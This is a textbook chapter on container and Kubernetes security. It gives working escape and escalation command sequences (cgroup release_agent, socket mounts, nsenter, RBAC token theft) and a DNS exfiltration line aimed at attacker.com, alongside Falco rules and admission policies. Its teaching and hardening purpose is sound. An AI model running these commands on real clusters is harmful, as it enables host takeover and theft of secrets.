# Domain 10, Chapter 10B — Container, Kubernetes, and Serverless Security

> **Scope.** Docker: daemon socket exposure, capabilities, seccomp profiles, user namespace remapping, `--privileged`, container escapes (nsenter, cgroup release_agent, core_pattern, procfs/sysfs, socket root-mount, runc CVEs). Kubernetes: API server authentication, RBAC, `system:masters`, Pod Security Standards, ServiceAccount tokens, NetworkPolicy, admission controllers, etcd security, kubelet API, kubectl lateral movement, service mesh, image security, supply chain. Serverless: Lambda/Functions/Cloud Functions security, event injection, persistence via layers/DLQ/environment, execution role abuse, serverless C2. Runtime: Falco, seccomp, AppArmor, SELinux. Supply chain: image signing, SBOM, admission policies.

---

## 1. Docker and container security

### 1.1 The Docker daemon socket

The Docker daemon (`dockerd`) listens on `/var/run/docker.sock` (Unix domain socket). Any process that can communicate with this socket has full control over the Docker daemon — including the ability to create privileged containers, mount the host filesystem, and execute commands as root on the host.

**Container escape via socket mount.** If a container is started with `-v /var/run/docker.sock:/var/run/docker.sock`, processes inside the container can use the Docker API to: (1) create a new container with `-v /:/host --privileged`, (2) `chroot /host`, and (3) execute arbitrary commands as root on the host. This is not a vulnerability — it is the intended behavior of socket mounting. The misconfiguration is mounting the socket into an untrusted container.

**Exploitation — step by step:**

```bash
# Inside a container with the Docker socket mounted
# Step 1: Install Docker CLI (or use curl against the API directly)
curl -fsSL https://get.docker.com | sh

# Step 2: Create a privileged container with host root filesystem
docker run -it --privileged --pid=host -v /:/hostfs alpine chroot /hostfs

# Step 3: Now executing as root on the host
cat /etc/shadow
whoami  # root

# Alternative: using curl against the socket API directly
curl --unix-socket /var/run/docker.sock \
  -X POST "http://localhost/v1.41/containers/create" \
  -H "Content-Type: application/json" \
  -d '{"Image":"alpine","Cmd":["/bin/sh"],"HostConfig":{"Binds":["/:/hostfs"],"Privileged":true}}'
```

**Detection — Falco rule for Docker socket access:**

```yaml
- rule: Container Accessing Docker Socket
  desc: Detect a container process communicating with the Docker socket
  condition: >
    evt.type in (connect, sendto) and
    container.id != host and
    fd.name = /var/run/docker.sock
  output: >
    Container accessing Docker socket
    (user=%user.name command=%proc.cmdline container=%container.name
     image=%container.image.repository socket=%fd.name)
  priority: WARNING
  tags: [container, docker, escape]
```

**Docker socket proxy.** A mitigation: expose a filtered proxy (e.g., `tecnativa/docker-socket-proxy`) that allows only specific API calls (container list, image pull) while blocking dangerous ones (container create with privileged, volume mount).

**Docker TCP API exposure.** The daemon can also listen on a TCP socket (`-H tcp://0.0.0.0:2375` unencrypted, `:2376` with TLS). Unauthenticated TCP exposure allows any network-reachable client to control the daemon remotely.

```bash
# Enumerate unauthenticated Docker API
curl -s http://<target>:2375/version
curl -s http://<target>:2375/containers/json
curl -s http://<target>:2375/images/json

# Create privileged container remotely
curl -s -X POST http://<target>:2375/containers/create \
  -H "Content-Type: application/json" \
  -d '{"Image":"alpine","Cmd":["/bin/sh"],"HostConfig":{"Privileged":true,"Binds":["/:/host"]}}'

# Start the created container
curl -s -X POST http://<target>:2375/containers/<id>/start
```

**Hardening the TCP socket** — in `/etc/docker/daemon.json`:

```json
{
  "hosts": ["unix:///var/run/docker.sock"],
  "tls": true,
  "tlscacert": "/etc/docker/ca.pem",
  "tlscert": "/etc/docker/server-cert.pem",
  "tlskey": "/etc/docker/server-key.pem",
  "tlsverify": true
}
```

Never bind to `0.0.0.0:2375`. If TCP is required, use mutual TLS on 2376 with client certificate verification. Scan for exposed Docker APIs: `nmap -p 2375,2376 --open <subnet>`.

**Hardening — prevent socket mounting via OPA Gatekeeper:**

```yaml
apiVersion: templates.gatekeeper.sh/v1
kind: ConstraintTemplate
metadata:
  name: k8sblockdockersock
spec:
  crd:
    spec:
      names:
        kind: K8sBlockDockerSock
  targets:
    - target: admission.k8s.gatekeeper.sh
      rego: |
        package k8sblockdockersock
        violation[{"msg": msg}] {
          container := input.review.object.spec.containers[_]
          mount := container.volumeMounts[_]
          mount.mountPath == "/var/run/docker.sock"
          msg := sprintf("Container %v mounts Docker socket", [container.name])
        }
        violation[{"msg": msg}] {
          volume := input.review.object.spec.volumes[_]
          volume.hostPath.path == "/var/run/docker.sock"
          msg := sprintf("Volume %v exposes Docker socket via hostPath", [volume.name])
        }
```

### 1.2 Capabilities in containers

Docker drops most capabilities by default. The default set (roughly matching Docker's official documentation): `CAP_CHOWN`, `CAP_DAC_OVERRIDE`, `CAP_FSETID`, `CAP_FOWNER`, `CAP_MKNOD`, `CAP_NET_RAW`, `CAP_SETGID`, `CAP_SETUID`, `CAP_SETFCAP`, `CAP_SETPCAP`, `CAP_NET_BIND_SERVICE`, `CAP_SYS_CHROOT`, `CAP_KILL`, `CAP_AUDIT_WRITE`.

Notably absent from the default set: `CAP_SYS_ADMIN` (the most dangerous — enables mounting, BPF, many kernel operations), `CAP_SYS_PTRACE` (enables ptrace of any process — cross-container if PID namespace is shared), `CAP_SYS_MODULE` (enables kernel module loading — host compromise), `CAP_NET_ADMIN` (enables network reconfiguration — can reach nf_tables, a vulnerability-rich subsystem).

Adding `CAP_SYS_ADMIN` to a container (via `--cap-add SYS_ADMIN`) is nearly equivalent to `--privileged` in terms of security impact.

**CAP_SYS_ADMIN + unshare exploit:**

```bash
# Inside a container with CAP_SYS_ADMIN
# Create a new user namespace + mount namespace
unshare -Urm

# Now inside a new namespace with effective root
# Mount the host cgroup filesystem
mkdir /tmp/cgrp
mount -t cgroup -o rdma cgroup /tmp/cgrp
# Proceed with release_agent escape (see §1.6)
```

**CAP_SYS_PTRACE abuse:**

```bash
# Inside a container with CAP_SYS_PTRACE and hostPID
# Find a host process
ps aux | grep sshd
# Inject a shared library into a host process
# Using /proc/<pid>/mem or ptrace() to inject shellcode
strace -p <host_pid>
# Or use a tool like linux-inject to inject .so into host process
```

**Device access exploitation:**

```bash
# Container started with --device /dev/sda
docker run -it --device /dev/sda:/dev/sda alpine

# Inside the container: mount the host's disk directly
mount /dev/sda1 /mnt
cat /mnt/etc/shadow
# Full host filesystem access, bypass all container isolation
```

**Hardening — drop all capabilities and add only what is needed:**

```yaml
# Kubernetes pod spec
securityContext:
  capabilities:
    drop:
      - ALL
    add:
      - NET_BIND_SERVICE  # only if binding to ports < 1024
  runAsNonRoot: true
  readOnlyRootFilesystem: true
  allowPrivilegeEscalation: false
```

### 1.3 Seccomp profiles

Docker applies a default seccomp profile that blocks approximately 44 syscalls considered dangerous for containers (out of ~300+ total). Blocked syscalls include: `mount`, `umount`, `ptrace`, `kexec_load`, `reboot`, `init_module`, `finit_module`, `create_module`, `unshare` (some variants), `pivot_root`, `swapon`/`swapoff`, `sethostname`, `setdomainname`, and others.

**Gaps in the default profile.** The profile allows `io_uring_setup`/`io_uring_enter` (which can bypass seccomp filtering for individual operations, Domain 2 Chapter 2B §4). The profile allows `bpf` in some configurations (needed for some container networking). These allowed syscalls are significant attack surface.

**Custom seccomp profile example — restrictive profile for a web server:**

```json
{
  "defaultAction": "SCMP_ACT_ERRNO",
  "architectures": ["SCMP_ARCH_X86_64", "SCMP_ARCH_X86", "SCMP_ARCH_AARCH64"],
  "syscalls": [
    {
      "names": [
        "accept", "accept4", "access", "arch_prctl", "bind", "brk",
        "clone", "close", "connect", "dup", "dup2", "dup3",
        "epoll_create", "epoll_create1", "epoll_ctl", "epoll_wait",
        "epoll_pwait", "execve", "exit", "exit_group", "fchmod",
        "fchown", "fcntl", "fstat", "futex", "getdents64",
        "getegid", "geteuid", "getgid", "getpid", "getppid",
        "getuid", "ioctl", "listen", "lseek", "madvise", "mmap",
        "mprotect", "munmap", "nanosleep", "newfstatat", "openat",
        "pipe", "pipe2", "poll", "ppoll", "pread64", "pwrite64",
        "read", "readlink", "recvfrom", "recvmsg", "rt_sigaction",
        "rt_sigprocmask", "rt_sigreturn", "sendmsg", "sendto",
        "set_robust_list", "set_tid_address", "setsockopt",
        "shutdown", "sigaltstack", "socket", "stat", "uname",
        "write", "writev"
      ],
      "action": "SCMP_ACT_ALLOW"
    }
  ]
}
```

**Applying seccomp in Kubernetes:**

```yaml
apiVersion: v1
kind: Pod
metadata:
  name: secure-pod
spec:
  securityContext:
    seccompProfile:
      type: Localhost
      localhostProfile: profiles/web-server.json
  containers:
    - name: web
      image: nginx:1.27-alpine
      securityContext:
        allowPrivilegeEscalation: false
        runAsNonRoot: true
        readOnlyRootFilesystem: true
```

### 1.4 User namespace remapping

`userns-remap` (configured in `/etc/docker/daemon.json`) maps the container's root user (UID 0) to an unprivileged host user (e.g., UID 100000). File access, capability checks, and resource ownership inside the container all use the remapped UID. A container escape that achieves "root" only has the privileges of the unprivileged host UID.

```json
// /etc/docker/daemon.json
{
  "userns-remap": "dockremap"
}
```

The remapped UID range is configured via `/etc/subuid` and `/etc/subgid` and `newuidmap`/`newgidmap` (Domain 2, Chapter 2C §3.4).

Limitation: user namespace remapping is not universally compatible — some workloads require real root (UID 0) for file ownership or capability reasons. Podman (rootless by default) and containerd's user-namespace support provide alternatives.

**Kubernetes user namespace support (beta since v1.28):**

```yaml
apiVersion: v1
kind: Pod
metadata:
  name: userns-pod
spec:
  hostUsers: false  # enables user namespace for the pod
  containers:
    - name: app
      image: myapp:latest
```

### 1.5 The `--privileged` flag

`--privileged` disables all security restrictions: all capabilities are granted, the seccomp filter is disabled, AppArmor/SELinux confinement is removed, all devices are accessible (the `devices` cgroup is open), and `/proc` and `/sys` are mounted without masking. A privileged container is effectively running on the host with root privileges.

**Detection — finding privileged containers:**

```bash
# Docker: list all privileged containers
docker inspect --format='{{.Name}} Privileged={{.HostConfig.Privileged}}' \
  $(docker ps -q) | grep "Privileged=true"

# Kubernetes: find privileged pods across all namespaces
kubectl get pods -A -o json | \
  jq -r '.items[] | select(.spec.containers[].securityContext.privileged==true) |
  "\(.metadata.namespace)/\(.metadata.name)"'

# crictl: inspect container security on a node
crictl inspect <container-id> | jq '.info.runtimeSpec.process.capabilities'
```

**Falco rule for privileged container launch:**

```yaml
- rule: Launch Privileged Container
  desc: Detect the launch of a privileged container
  condition: >
    container.privileged=true and
    container and
    evt.type=container
  output: >
    Privileged container started
    (user=%user.name command=%proc.cmdline container=%container.name
     image=%container.image.repository)
  priority: CRITICAL
  tags: [container, privilege, cis]
```

### 1.6 Container escape techniques

#### 1.6.1 CVE-2019-5736 — runc /proc/self/exe overwrite

**Mechanism.** runc is the OCI container runtime used by Docker and containerd. When `runc exec` (or `docker exec`) is called, the runc binary enters the container's namespaces to start the new process. During this brief window, a malicious process inside the container can open a file descriptor to `/proc/self/exe` — which resolves to the host's runc binary. The attacker overwrites the host runc binary with a malicious payload. The next time any container operation invokes runc on the host, the attacker's code executes as root on the host.

**PoC flow:**

1. Attacker creates a container image where the entrypoint is a binary that loops, waiting for `/proc/self/exe` to point to the host runc binary.
2. When `docker exec` is called against the container, runc enters the container's PID namespace.
3. The malicious process inside the container opens `/proc/self/exe` for writing via `O_PATH`, then uses `/proc/self/fd/<N>` to open the actual file for writing.
4. The host runc binary is overwritten.
5. Next invocation of runc executes the attacker's payload as root on the host.

**Mitigation.** runc >= 1.0.0-rc6 patched this by making runc clone itself into a memfd before entering container namespaces, so `/proc/self/exe` points to the in-memory copy rather than the on-disk binary. Additional defense: mount runc binary as read-only, use a non-writable filesystem for `/usr/bin/runc`, use user namespace remapping.

#### 1.6.2 CVE-2024-21626 — Leaky Vessels (runc file descriptor leak)

**Mechanism.** During container startup, runc leaked a file descriptor pointing to the host filesystem. The `WORKDIR` Dockerfile instruction is processed by runc via `process.cwd`. An attacker constructs a Dockerfile with `WORKDIR /proc/self/fd/<N>` where `<N>` is the leaked file descriptor number. When the container starts, the working directory resolves to a host filesystem path via the leaked fd, breaking out of the container's mount namespace.

**Exploitation:**

```dockerfile
# Malicious Dockerfile exploiting CVE-2024-21626
FROM ubuntu:22.04
# The leaked fd number varies; 7 and 8 were common
WORKDIR /proc/self/fd/7
RUN cat /etc/shadow  # reads host file during build
```

**Mitigation.** runc >= 1.1.12 closes all file descriptors inherited from the parent process before entering container namespaces. containerd >= 1.6.28 and Docker >= 25.0.2 include the patched runc. Detection: check `runc --version` on all container hosts.

#### 1.6.3 nsenter with host PID namespace

If the container has `hostPID: true` (or `--pid=host`), it shares the host's PID namespace. The container can enter all namespaces of PID 1 (the host's init) to gain full host access.

```bash
# Inside a container with hostPID: true
nsenter -t 1 -m -u -i -n -p -- /bin/bash
# Now executing in host context
# -t 1  = target PID 1 (host init)
# -m    = mount namespace
# -u    = UTS namespace
# -i    = IPC namespace
# -n    = network namespace
# -p    = PID namespace
```

**Detection — Falco rule:**

```yaml
- rule: Nsenter Used to Access Host
  desc: Detect nsenter with target PID 1 indicating host namespace entry
  condition: >
    spawned_process and
    proc.name = nsenter and
    proc.args contains "-t 1"
  output: >
    nsenter used to enter host namespaces
    (user=%user.name command=%proc.cmdline container=%container.name
     image=%container.image.repository)
  priority: CRITICAL
  tags: [container, escape, nsenter]
```

#### 1.6.4 Cgroup release_agent escape

If the container has `CAP_SYS_ADMIN` and can write to cgroup files: create a cgroup, set `notify_on_release = 1`, set `release_agent` to a path on the host filesystem, then trigger the release (by making the cgroup empty). The kernel executes the `release_agent` as root on the host. This is CVE-2022-0492.

**Exploitation — full command sequence:**

```bash
# Inside a container with CAP_SYS_ADMIN and cgroup v1
# Step 1: Find the host path of the container's overlayfs
host_path=$(sed -n 's/.*upperdir=\([^,]*\).*/\1/p' /etc/mtab)

# Step 2: Mount a cgroup controller
mkdir /tmp/cgrp
mount -t cgroup -o memory cgroup /tmp/cgrp

# Step 3: Create a child cgroup
mkdir /tmp/cgrp/exploit

# Step 4: Enable release notification
echo 1 > /tmp/cgrp/exploit/notify_on_release

# Step 5: Write the payload to the container filesystem
# (accessible via host_path on the host)
cat > /cmd <<'EOF'
#!/bin/sh
cat /etc/shadow > /tmp/cgrp/output
EOF
chmod +x /cmd

# Step 6: Set release_agent to the payload path on the host
echo "$host_path/cmd" > /tmp/cgrp/release_agent

# Step 7: Trigger the release by creating and killing a process in the cgroup
sh -c "echo \$\$ > /tmp/cgrp/exploit/cgroup.procs && sleep 0 && exit"

# Step 8: Read the output
cat /tmp/cgrp/output
```

**Mitigation.** Mitigated by cgroup namespaces (the container cannot see or write to host cgroup paths), by dropping `CAP_SYS_ADMIN`, and by using cgroup v2 (which does not have the `release_agent` mechanism in the same exploitable form). Seccomp profiles blocking `mount` also prevent this chain.

#### 1.6.5 core_pattern escape

If the container can write to `/proc/sys/kernel/core_pattern` (possible with mounted procfs and insufficient masking), the attacker sets it to `|/path/to/script` and triggers a crash. The kernel executes the script as root on the host.

```bash
# Inside a container with write access to /proc/sys
echo "|/path/on/host/to/script" > /proc/sys/kernel/core_pattern
# Trigger a segfault to invoke the handler
kill -SIGSEGV $$
```

**Mitigation.** Docker's default `/proc/sys` masking makes this read-only. Lockdown LSM in integrity or confidentiality mode also prevents this. Verify masking: `mount | grep proc` inside the container should show read-only mounts for sensitive procfs paths.

#### 1.6.6 Docker socket root filesystem mount

If the Docker socket is mounted, immediate host root access:

```bash
docker run -v /:/host --privileged alpine chroot /host
```

This chains with all other host-level attacks: credential theft, persistence via cron/systemd, kernel module loading.

### 1.7 Container runtimes — containerd vs CRI-O

| Feature | containerd | CRI-O |
|---|---|---|
| Origin | Docker (extracted) | Red Hat / Kubernetes SIG |
| CRI support | Via CRI plugin | Native CRI implementation |
| OCI runtime | runc (default), gVisor, Kata | runc (default), crun, Kata |
| Image management | Full (pull, push, build-capable) | Pull-only (Kubernetes-focused) |
| Footprint | Moderate | Minimal |
| Kubernetes integration | Standard | Purpose-built |
| Seccomp default | Profile shipped | Uses Kubernetes PSS |

Both implement the OCI Runtime Specification. The security-relevant difference: CRI-O has a smaller attack surface because it implements only the Kubernetes CRI (no build, no standalone container management). `crun` (CRI-O default on RHEL) is written in C with a smaller codebase than runc (Go), trading garbage-collector safety for reduced binary size and faster startup.

### 1.8 Rootless containers — Podman

**Mechanism.** Podman runs the entire container stack (image pull, container creation, networking) as an unprivileged user. Uses user namespaces for UID/GID mapping, `slirp4netns` or `pasta` for rootless networking, and `fuse-overlayfs` for storage. No daemon process.

```bash
# Run rootless (no sudo, no daemon)
podman run --rm -it alpine sh

# Check UID mapping
podman unshare cat /proc/self/uid_map

# ID mapping configuration
cat /etc/subuid   # e.g., user:100000:65536
cat /etc/subgid   # e.g., user:100000:65536
```

**Security advantage.** A container escape from a rootless Podman container yields the privileges of the unprivileged host user, not root. Combined with user namespaces, the blast radius is contained to the unprivileged user's permissions.

**Limitations.** Cannot bind to ports < 1024 without `net.ipv4.ip_unprivileged_port_start=0`. Some workloads requiring real root or device access are incompatible. Networking performance is lower than root-mode due to slirp4netns overhead (pasta mitigates this).

**Rootless Docker alternative:**

```bash
# Docker rootless mode (uses rootlesskit)
dockerd-rootless-setuptool.sh install
systemctl --user start docker
docker context use rootless
```

### 1.9 Container forensics and evidence preservation

```bash
# Export container filesystem for offline analysis
docker export <container-id> > container-fs.tar

# Capture container metadata (full config, mounts, network, state)
docker inspect <container-id> > container-inspect.json

# Capture running process list
docker exec <container-id> ps auxwwf > processes.txt

# Capture network connections
docker exec <container-id> ss -tlnp > network.txt

# Copy specific evidence files
docker cp <container-id>:/var/log/ ./evidence/container-logs/

# Diff changes from image baseline (shows added/changed/deleted files)
docker diff <container-id> > filesystem-changes.txt

# Capture container logs
docker logs --timestamps <container-id> > docker-logs.txt 2>&1
```

For containerd/CRI-O managed containers:

```bash
crictl inspect <container-id> > inspect.json
crictl logs <container-id> > container.log
# Export rootfs via ctr (containerd)
ctr snapshot mounts /tmp/snapshot <snapshot-key> | xargs mount -t overlay
tar cf rootfs.tar /tmp/snapshot/
```

**Evidence integrity:**

```bash
sha256sum container-fs.tar > container-fs.tar.sha256
sha256sum container-inspect.json >> evidence-hashes.sha256
# Timestamp in UTC ISO 8601
date -u +"%Y-%m-%dT%H:%M:%SZ" > evidence-timestamp.txt
```

**Volatile evidence priority.** Capture in order: (1) running processes and network connections, (2) container metadata and state, (3) filesystem diff, (4) full filesystem export, (5) logs. Process and network state is lost when the container stops; filesystem persists in the storage driver until the container is removed.

---

## 2. Kubernetes security

**Kubernetes attack surface — component overview:**

| Component | Default Port | Attack Surface |
|---|---|---|
| kube-apiserver | 6443 | AuthN/AuthZ bypass, API abuse, RBAC escalation |
| etcd | 2379/2380 | Secret extraction, cluster state manipulation |
| kubelet | 10250 (auth), 10255 (read-only) | Pod exec, log read, container listing |
| kube-proxy | 10256 (health) | Service routing manipulation |
| CoreDNS | 53 (TCP/UDP) | DNS poisoning, service discovery enumeration |
| Cloud Controller Manager | varies | Cloud API credential theft, cloud resource manipulation |
| kube-scheduler | 10259 | Pod scheduling manipulation |
| kube-controller-manager | 10257 | Controller abuse, token signing key access |

### 2.1 API server authentication and anonymous access

The Kubernetes API server supports multiple authentication methods (evaluated in order until one succeeds): X.509 client certificates (the CN is the username, the O is the group), bearer tokens (static token file or bootstrap tokens), OpenID Connect tokens (from an IdP like Azure AD, Google, Dex), and webhook token authentication (delegating to an external service).

The `system:masters` group is hardcoded in the API server as a bypass for all RBAC checks — any principal in this group has unrestricted access. Certificate signing requests that specify `O=system:masters` create cluster-admin credentials. Auditing who can sign CSRs is critical.

**Anonymous access exploitation.** If `--anonymous-auth=true` (the default) and no authorization policy denies the `system:anonymous` user, the API server is accessible without credentials.

```bash
# Probe for anonymous access
curl -sk https://<api-server>:6443/api/v1/namespaces
curl -sk https://<api-server>:6443/version
curl -sk https://<api-server>:6443/api/v1/pods

# If accessible, enumerate secrets
curl -sk https://<api-server>:6443/api/v1/namespaces/kube-system/secrets
```

**Hardening — API server flags:**

```
--anonymous-auth=false
--authorization-mode=RBAC,Node
--enable-admission-plugins=NodeRestriction,PodSecurity
--audit-log-path=/var/log/kube-audit.log
--audit-policy-file=/etc/kubernetes/audit-policy.yaml
--tls-min-version=VersionTLS12
```

**Audit policy for detecting API server abuse:**

```yaml
apiVersion: audit.k8s.io/v1
kind: Policy
rules:
  - level: RequestResponse
    resources:
      - group: ""
        resources: ["secrets", "configmaps"]
    verbs: ["get", "list", "watch", "create", "update", "delete"]
  - level: Metadata
    resources:
      - group: ""
        resources: ["pods/exec", "pods/attach", "pods/portforward"]
  - level: Metadata
    resources:
      - group: "rbac.authorization.k8s.io"
        resources: ["clusterroles", "clusterrolebindings", "roles", "rolebindings"]
  - level: None
    users: ["system:kube-proxy"]
    verbs: ["watch"]
    resources:
      - group: ""
        resources: ["endpoints", "services"]
```

### 2.2 RBAC and privilege escalation

Kubernetes RBAC binds **Roles** (namespaced) or **ClusterRoles** (cluster-wide) to subjects (users, groups, service accounts) via **RoleBindings** or **ClusterRoleBindings**.

A Role specifies: `apiGroups` (e.g., `""` for core, `"apps"` for Deployments), `resources` (e.g., `pods`, `secrets`, `configmaps`), and `verbs` (e.g., `get`, `list`, `create`, `delete`, `update`, `patch`, `watch`).

**Dangerous permission combinations:**

- `create pods` + `*` verbs — the attacker creates a pod with a privileged security context and mounts the host filesystem.
- `get secrets` in sensitive namespaces — reads all secrets including service account tokens.
- `escalate`/`bind` verbs on roles — allows creating RoleBindings with more permissions than the caller has.
- `impersonate` verb — allows acting as another user/group/service account.
- `create` on `serviceaccounts/token` — can mint tokens for any service account in the namespace.

**RBAC escalation chain — create pods → cluster-admin:**

```bash
# Step 1: Attacker has "create pods" permission in a namespace
# Step 2: Create a pod that mounts a privileged service account token
kubectl apply -f - <<'EOF'
apiVersion: v1
kind: Pod
metadata:
  name: escalation-pod
  namespace: kube-system
spec:
  serviceAccountName: clusterrole-aggregation-controller
  automountServiceAccountToken: true
  containers:
    - name: exploit
      image: alpine
      command: ["/bin/sh", "-c", "cat /var/run/secrets/kubernetes.io/serviceaccount/token && sleep 3600"]
      securityContext:
        privileged: true
  hostPID: true
  hostNetwork: true
EOF

# Step 3: Extract the service account token
kubectl exec escalation-pod -- cat /var/run/secrets/kubernetes.io/serviceaccount/token

# Step 4: Use the token to authenticate with elevated privileges
kubectl --token=<stolen-token> auth can-i --list
kubectl --token=<stolen-token> get secrets -A
```

**RBAC auditing:**

```bash
# Find all cluster-admin bindings
kubectl get clusterrolebindings -o json | \
  jq -r '.items[] | select(.roleRef.name=="cluster-admin") |
  "\(.metadata.name): \(.subjects)"'

# Find service accounts with dangerous permissions
kubectl auth can-i --list --as=system:serviceaccount:default:default

# Find all roles that can create pods
kubectl get roles,clusterroles -A -o json | \
  jq -r '.items[] | select(.rules[]? | .resources[]? == "pods" and
  (.verbs[]? == "create" or .verbs[]? == "*")) | .metadata.name'
```

### 2.3 Pod security

Pod-level security settings that matter:

`hostPID: true` — the pod shares the host's PID namespace. Can see and signal all host processes. Combined with `CAP_SYS_PTRACE`, can ptrace any host process.

`hostIPC: true` — shares host IPC namespace. Can access host shared memory segments.

`hostNetwork: true` — the pod uses the host's network stack. Can bind to any port, see all host network traffic, and access services that listen on localhost.

`privileged: true` — equivalent to Docker's `--privileged`.

`capabilities.add: [SYS_ADMIN]` — adds `CAP_SYS_ADMIN`, enabling the cgroup escape and many other privilege escalations.

`allowPrivilegeEscalation: true` — allows `setuid` binaries and `PR_SET_NO_NEW_PRIVS`=false.

**Pod Security Standards (PSS).** Three profiles: `privileged` (unrestricted), `baseline` (prevents known privilege escalations — blocks `hostPID`, `hostIPC`, `hostNetwork`, `privileged`, most capabilities), and `restricted` (requires `runAsNonRoot`, drops ALL capabilities, requires `readOnlyRootFilesystem`, etc.). PSS is enforced by the `PodSecurity` admission controller (replacing the deprecated `PodSecurityPolicy`).

**Enforcing PSS on a namespace:**

```yaml
apiVersion: v1
kind: Namespace
metadata:
  name: production
  labels:
    pod-security.kubernetes.io/enforce: restricted
    pod-security.kubernetes.io/enforce-version: latest
    pod-security.kubernetes.io/audit: restricted
    pod-security.kubernetes.io/warn: restricted
```

**Hardened pod spec — restricted baseline:**

```yaml
apiVersion: v1
kind: Pod
metadata:
  name: hardened-app
spec:
  automountServiceAccountToken: false
  securityContext:
    runAsNonRoot: true
    runAsUser: 10001
    runAsGroup: 10001
    fsGroup: 10001
    seccompProfile:
      type: RuntimeDefault
  containers:
    - name: app
      image: myregistry.io/app@sha256:abc123...
      securityContext:
        allowPrivilegeEscalation: false
        readOnlyRootFilesystem: true
        capabilities:
          drop:
            - ALL
      resources:
        limits:
          memory: "256Mi"
          cpu: "500m"
        requests:
          memory: "128Mi"
          cpu: "250m"
      volumeMounts:
        - name: tmp
          mountPath: /tmp
  volumes:
    - name: tmp
      emptyDir:
        sizeLimit: 100Mi
```

### 2.4 ServiceAccount tokens and abuse

**ServiceAccount token projection.** Each pod receives a projected service account token (JWT) mounted at `/var/run/secrets/kubernetes.io/serviceaccount/token`. The `TokenRequest` API issues time-bound, audience-bound tokens. A compromised pod can use its token to authenticate to the API server with the service account's RBAC permissions.

**ServiceAccount token auto-mount abuse:**

```bash
# Inside a compromised pod — extract the token
TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
CACERT=/var/run/secrets/kubernetes.io/serviceaccount/ca.crt
APISERVER=https://${KUBERNETES_SERVICE_HOST}:${KUBERNETES_SERVICE_PORT}

# Enumerate permissions
curl -sk --cacert $CACERT -H "Authorization: Bearer $TOKEN" \
  "$APISERVER/apis/authorization.k8s.io/v1/selfsubjectaccessreviews" \
  -X POST -H "Content-Type: application/json" \
  -d '{"apiVersion":"authorization.k8s.io/v1","kind":"SelfSubjectAccessReview","spec":{"resourceAttributes":{"verb":"list","resource":"secrets"}}}'

# List secrets if permitted
curl -sk --cacert $CACERT -H "Authorization: Bearer $TOKEN" \
  "$APISERVER/api/v1/namespaces/default/secrets"

# Kubernetes secrets are base64-encoded, not encrypted
# Decode: echo "<base64-value>" | base64 -d
```

**Hardening — disable auto-mount:**

```yaml
apiVersion: v1
kind: ServiceAccount
metadata:
  name: app-sa
  namespace: production
automountServiceAccountToken: false
```

### 2.5 NetworkPolicy

Controls pod-to-pod and pod-to-external traffic. Enforcement depends on the CNI plugin (Calico, Cilium, etc.) — not all CNI plugins support NetworkPolicy. Without a NetworkPolicy, all pod-to-pod traffic is allowed by default (flat network).

**Default-deny baseline:**

```yaml
apiVersion: networking.k8s.io/v1
kind: NetworkPolicy
metadata:
  name: default-deny-all
  namespace: production
spec:
  podSelector: {}
  policyTypes:
    - Ingress
    - Egress
```

**Allow specific traffic — web app to database:**

```yaml
apiVersion: networking.k8s.io/v1
kind: NetworkPolicy
metadata:
  name: allow-web-to-db
  namespace: production
spec:
  podSelector:
    matchLabels:
      app: postgres
  policyTypes:
    - Ingress
  ingress:
    - from:
        - podSelector:
            matchLabels:
              app: web
      ports:
        - protocol: TCP
          port: 5432
```

**Allow DNS egress (required for most workloads after default-deny):**

```yaml
apiVersion: networking.k8s.io/v1
kind: NetworkPolicy
metadata:
  name: allow-dns
  namespace: production
spec:
  podSelector: {}
  policyTypes:
    - Egress
  egress:
    - to:
        - namespaceSelector:
            matchLabels:
              kubernetes.io/metadata.name: kube-system
          podSelector:
            matchLabels:
              k8s-app: kube-dns
      ports:
        - protocol: UDP
          port: 53
        - protocol: TCP
          port: 53
```

**DNS-based exfiltration in Kubernetes.** An attacker in a pod with DNS egress can exfiltrate data by encoding it in DNS queries: `dig $(cat /etc/shadow | base64 | head -c 60).attacker.com`. Detection requires DNS query logging (CoreDNS log plugin or Cilium DNS visibility) and anomaly detection on query patterns.

**Cilium Layer 7 network policy (HTTP-aware):**

```yaml
apiVersion: cilium.io/v2
kind: CiliumNetworkPolicy
metadata:
  name: l7-api-policy
  namespace: production
spec:
  endpointSelector:
    matchLabels:
      app: api
  ingress:
  - fromEndpoints:
    - matchLabels:
        app: web
    toPorts:
    - ports:
      - port: "8080"
        protocol: TCP
      rules:
        http:
        - method: "GET"
          path: "/api/v1/.*"
        - method: "POST"
          path: "/api/v1/orders"
```

Cilium L7 policies inspect HTTP headers and paths at the proxy layer, enabling method+path restrictions that standard L3/L4 NetworkPolicy cannot express. Requires Cilium with Envoy proxy enabled.

### 2.6 Admission controllers, etcd, and OPA/Gatekeeper

**Admission controllers** intercept API requests after authentication/authorization but before persistence. `ValidatingWebhookConfiguration` calls external webhooks that can reject requests. `MutatingWebhookConfiguration` can modify requests (e.g., injecting sidecar containers).

**OPA/Gatekeeper** provides policy-as-code enforcement. ConstraintTemplates define Rego policies; Constraints apply them.

**Gatekeeper policy — block privileged containers:**

```yaml
apiVersion: templates.gatekeeper.sh/v1
kind: ConstraintTemplate
metadata:
  name: k8spspprivilegedcontainer
spec:
  crd:
    spec:
      names:
        kind: K8sPSPPrivilegedContainer
  targets:
    - target: admission.k8s.gatekeeper.sh
      rego: |
        package k8spspprivilegedcontainer
        violation[{"msg": msg, "details": {}}] {
          c := input.review.object.spec.containers[_]
          c.securityContext.privileged == true
          msg := sprintf("Privileged container not allowed: %v", [c.name])
        }
        violation[{"msg": msg, "details": {}}] {
          c := input.review.object.spec.initContainers[_]
          c.securityContext.privileged == true
          msg := sprintf("Privileged init container not allowed: %v", [c.name])
        }
---
apiVersion: constraints.gatekeeper.sh/v1beta1
kind: K8sPSPPrivilegedContainer
metadata:
  name: block-privileged
spec:
  match:
    kinds:
      - apiGroups: [""]
        kinds: ["Pod"]
    excludedNamespaces: ["kube-system"]
```

**Kyverno policy — require non-root and read-only root filesystem:**

```yaml
apiVersion: kyverno.io/v1
kind: ClusterPolicy
metadata:
  name: require-run-as-non-root
spec:
  validationFailureAction: Enforce
  rules:
    - name: run-as-non-root
      match:
        any:
          - resources:
              kinds:
                - Pod
      validate:
        message: "Containers must run as non-root"
        pattern:
          spec:
            containers:
              - securityContext:
                  runAsNonRoot: true
                  readOnlyRootFilesystem: true
                  allowPrivilegeEscalation: false
```

